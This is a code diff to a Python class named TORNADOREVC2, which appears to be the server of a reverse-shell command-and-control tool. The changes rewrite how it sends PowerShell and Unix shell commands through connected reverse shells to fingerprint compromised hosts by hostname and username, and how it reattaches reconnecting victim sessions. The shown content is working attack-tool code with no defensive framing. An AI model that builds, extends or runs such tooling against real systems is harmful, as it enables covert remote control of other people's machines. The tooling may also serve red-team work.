@@ -24,6 +24,8 @@ except ImportError:
 from .constants import (
     CLIENT_COMMANDS,
     ID_COMMANDS,
+    IDENT_MARK_END,
+    IDENT_MARK_START,
     MAIN_COMMANDS,
     SYSINFO_MARK_END,
     XFER_MARK_END,
@@ -666,6 +668,17 @@ class TORNADOREVC2:
                     if log_dir:
                         print(f"    {self.colors['blue']}Log: {log_dir}{self.colors['end']}")
 
+    def _live_session_ids(self):
+        ids = set()
+        with self.client_lock:
+            for sock, info in self.revshell_clients.items():
+                try:
+                    if sock.fileno() != -1 and info.get('id') is not None:
+                        ids.add(info['id'])
+                except Exception:
+                    pass
+        return ids
+
     def infer_platform(self, output):
         osver = output.lower()
         if "windows" in osver or "microsoft" in osver or "c:\\" in osver:
@@ -679,28 +692,35 @@ class TORNADOREVC2:
     def _probe_identity(self, client_sock, shell_type):
         """Collect hostname and username for stable session fingerprinting."""
         if shell_type == 'windows':
-            cmd = self._win_ps_inline("Write-Output ($env:COMPUTERNAME + '|' + $env:USERNAME)")
+            win_ps = (
+                f"'{IDENT_MARK_START}'+$env:COMPUTERNAME+'|'+$env:USERNAME+'{IDENT_MARK_END}'"
+            )
+            payload = self._run_marked(
+                client_sock, '', win_ps, 'windows', timeout=8.0,
+                start_mark=IDENT_MARK_START, end_mark=IDENT_MARK_END, strip_ws=False,
+            )
         elif shell_type == 'unix':
-            cmd = (
-                "printf '%s|%s' "
-                "\"$(hostname 2>/dev/null | head -1 | tr -d '\\r\\n')\" "
-                "\"$(id -un 2>/dev/null || whoami 2>/dev/null | tr -d '\\r\\n')\""
+            unix_cmd = (
+                f"printf '%s' '{IDENT_MARK_START}'; "
+                f"printf '%s|%s' "
+                f"\"$(hostname 2>/dev/null | head -1 | tr -d '\\r\\n')\" "
+                f"\"$(id -un 2>/dev/null || whoami 2>/dev/null | tr -d '\\r\\n')\"; "
+                f"printf '%s' '{IDENT_MARK_END}'"
+            )
+            payload = self._run_marked(
+                client_sock, unix_cmd, '', shell_type, timeout=8.0,
+                start_mark=IDENT_MARK_START, end_mark=IDENT_MARK_END, strip_ws=False,
             )
         else:
+            for st in ('unix', 'windows'):
+                identity = self._probe_identity(client_sock, st)
+                if identity:
+                    return identity
             return {}
-        self._flush_shell(client_sock, timeout=0.3)
-        if not self.send_to_revshell(client_sock, cmd):
+
+        if not payload or '|' not in payload:
             return {}
-        output = self._strip_ansi(self.recv_output(client_sock, timeout=3.0))
-        line = ''
-        for candidate in reversed(output.splitlines()):
-            candidate = candidate.strip()
-            if '|' in candidate:
-                line = candidate
-                break
-        if not line or '|' not in line:
-            return {}
-        host, user = line.split('|', 1)
+        host, user = payload.split('|', 1)
         user = user.strip().split('\\')[-1]
         identity = {
             'hostname': host.strip(),
@@ -1120,13 +1140,13 @@ class TORNADOREVC2:
         self.recv_output(client_sock, timeout=2.0)
 
         fingerprint = compute_fingerprint(client_info, probe_output)
-        prior = self.registry.find_reconnect(fingerprint, probe_output, client_info)
+        prior = self.registry.find_reconnect(
+            fingerprint, probe_output, client_info, live_ids=self._live_session_ids(),
+        )
         reconnected = False
         previous_id = None
 
-        if prior and prior.get('status') == 'disconnected' and (
-            prior.get('log_session_id') or prior.get('log_dir')
-        ):
+        if prior:
             fingerprint = prior.get('fingerprint') or fingerprint
             previous_id = prior.get('session_id')
             client_id = prior.get('session_id', self.client_counter + 1)
